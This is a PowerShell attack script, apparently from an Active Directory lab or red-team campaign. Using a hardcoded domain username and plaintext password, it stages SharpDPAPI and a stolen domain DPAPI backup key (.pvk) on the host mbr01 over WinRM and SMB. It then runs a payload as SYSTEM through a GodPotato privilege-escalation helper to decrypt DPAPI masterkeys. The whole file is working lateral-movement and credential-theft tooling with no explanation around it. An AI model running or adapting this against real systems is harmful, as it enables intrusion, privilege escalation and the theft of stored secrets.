# Stage CRTE SharpDPAPI + PVK to mbr01 via WinRM/SMB, then run masterkeys /pvk as SYSTEM
$ErrorActionPreference = 'Continue'
$target = 'mbr01.child.cadre.local'
$user = 'child.cadre.local\analyst_t1'
$pass = 'T13r_An@lyst!'
$securePass = ConvertTo-SecureString $pass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $securePass)
$remote = 'C:\Windows\Temp\cadre-tools'

Write-Output '--- ensure remote dir ---'
Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock { param($d) New-Item -ItemType Directory -Path $d -Force | Out-Null; "DIR_OK $d" } -ArgumentList $remote

Write-Output '--- copy files ---'
$pairs = @(
  @{ Src = 'C:\Tools\ADTools\CRTE-2026\SharpDPAPI.exe'; Dst = 'sdp-crte.exe' },
  @{ Src = 'C:\Tools\ADTools\ntds_capi_0_73eeb965-bf4b-4e9a-8e3e-1814df83d602.keyx.rsa.pvk'; Dst = 'ntds-crte.pvk' }
)
foreach ($p in $pairs) {
  if (-not (Test-Path $p.Src)) { Write-Output "SRC_MISSING $($p.Src)"; continue }
  Copy-Item $p.Src "\\$target\C`$\Windows\Temp\cadre-tools\$($p.Dst)" -Force
  $chk = Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock { param($f) if (Test-Path $f) { "OK|$((Get-Item $f).Length)" } else { 'MISSING' } } -ArgumentList "$remote\$($p.Dst)"
  Write-Output "STAGED $($p.Dst) -> $chk"
}

Write-Output '--- run masterkeys /pvk via system-exec ---'
$payload = Get-Content 'C:\Tools\wt035g-mbr01-payload3.ps1' -Raw
& 'C:\Tools\campaign-a-t043-system-exec.ps1' -Server '192.168.77.22' -Username 'analyst_t1' -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock $payload
Write-Output 'STAGE_RUN_DONE'
